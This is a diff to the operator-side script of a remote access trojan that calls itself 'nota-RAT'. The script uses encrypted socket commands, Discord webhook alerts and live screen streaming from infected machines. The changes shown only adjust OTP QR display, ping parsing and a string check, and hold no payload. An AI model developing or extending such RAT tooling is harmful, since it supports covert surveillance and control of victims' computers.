@@ -2,6 +2,7 @@ import socket, argparse, subprocess, re, time, os, pyotp, maskpass, qrcode
 from sys import platform
 from vidstream import StreamingServer
 from threading import Thread
+from PIL import Image
 from cryptography.fernet import Fernet
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
@@ -109,8 +110,10 @@ else:
             img = qrcode.make(uri)
             img.save('nota-RAT_qrcode.png')
             f.writelines(f"OTP={secret_key}")
-            print(f"\n[{INFO}] Successfully generated qrcode in CWD")
-            print(f"[{INFO}] Authentication URI: {uri}")
+            print(f"\n[{INFO}] Authentication URI: {uri}")
+            print(f"\n[{INFO}] Successfully generated qrcode")
+            imgs = Image.open('nota-RAT_qrcode.png')
+            imgs.show()
             pwd = maskpass.askpass(prompt=f"\n[{IMPORTANT}] Enter code: ", mask="*")
             totp = pyotp.TOTP(secret_key)
             totp_verify = totp.verify(pwd)
@@ -136,7 +139,13 @@ if args.discord:
     if platform == 'win32':
         pings_command = subprocess.run(["ping", f"{client_socket.getpeername()[0]}"], capture_output = True).stdout.decode()
         ping = re.search(", Average = (.*)\r", pings_command)
-        ping = ping.group()
+        ping = ping.groups()
+        ping = str(ping)
+        ping = ping.replace("(", "")
+        ping = ping.replace(")", "")
+        ping = ping.replace(",", "")
+        ping = ping.replace("'", "")
+        ping = ping.replace("'", "")
     else: 
         pings_command = subprocess.run(["ping", f"{client_socket.getpeername()[0]}", "-c", "4"], capture_output = True).stdout.decode()
         ping = re.split("/", pings_command)
@@ -243,8 +252,10 @@ while True:
                     with open("config.txt", 'w') as j:
                         j.writelines(f"OTP={secret_key}")
                         j.close()
-                    print(f"\n[{INFO}] Successfully generated qrcode in CWD")
-                    print(f"[{INFO}] Authentication URI: {uri}")
+                    print(f"\n[{INFO}] Authentication URI: {uri}")
+                    print(f"\n[{INFO}] Successfully generated qrcode")
+                    imgs = Image.open('nota-RAT_qrcode.png')
+                    imgs.show()
                     continue
                 if choice == "n":
                     continue
@@ -258,6 +269,7 @@ while True:
                     with open("config.txt", "w") as g:
                         g.write("OTP=no")
                         g.close()
+                        os.remove("nota-RAT_qrcode.png")
                     continue
                 if choice == "n":
                     continue
@@ -322,7 +334,7 @@ while True:
                 server_state = client_socket.recv(BUFFER_SIZE)
                 server_state = Fernet(key).decrypt(server_state).decode()
                 print(f"[{IMPORTANT}] {server_state}")
-            if server_location == "y":
+            if server_location == "yes":
                 print(f"\n[{IMPORTANT}] Found live Streaming Server on RAT")
             print(f"[{IMPORTANT}] Starting live Streaming Server ......")
             p = Thread(target=receiver.start_server)
